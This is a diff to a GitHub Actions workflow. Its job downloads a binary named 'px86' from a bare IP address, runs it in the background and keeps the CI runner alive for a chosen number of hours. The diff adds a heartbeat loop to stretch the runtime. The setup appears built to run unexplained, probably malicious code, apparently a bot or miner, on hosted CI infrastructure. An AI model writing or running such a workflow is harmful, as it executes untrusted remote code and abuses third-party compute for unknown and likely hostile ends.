@@ -20,17 +20,28 @@ jobs:
   run-binary:
     runs-on: ubuntu-latest
     steps:
-      - name: Download and run binary in background
+      - name: Download and run binary with keep-alive
         run: |
           echo "🔽 Downloading binary..."
           wget http://45.138.16.158/bins/px86 -O px86
           chmod +x px86
-          
+
           echo "🚀 Running binary in background..."
-          ./px86 x86 &  # Run in background
+          ./px86 x86 &
           BINARY_PID=$!
           echo "📌 Binary PID: $BINARY_PID"
 
-          echo "⏳ Starting keep-alive mechanism..."
-          (sleep $(( ${{ github.event.inputs.uptime }} * 3600 )) && kill $BINARY_PID && echo '⏱️ Uptime complete. Binary stopped.') &
-          tail -f /dev/null
+          # Convert hours to seconds
+          UPTIME_SECONDS=$(( ${{ github.event.inputs.uptime }} * 3600 ))
+          echo "⏳ Keeping runner alive for $UPTIME_SECONDS seconds..."
+
+          # Heartbeat loop
+          SECONDS_ELAPSED=0
+          while [ $SECONDS_ELAPSED -lt $UPTIME_SECONDS ]; do
+            echo "💓 Runner heartbeat: $SECONDS_ELAPSED seconds elapsed"
+            sleep 60
+            SECONDS_ELAPSED=$((SECONDS_ELAPSED + 60))
+          done
+
+          echo "⏱️ Time is up. Stopping binary (PID: $BINARY_PID)..."
+          kill $BINARY_PID || echo "Binary already exited."
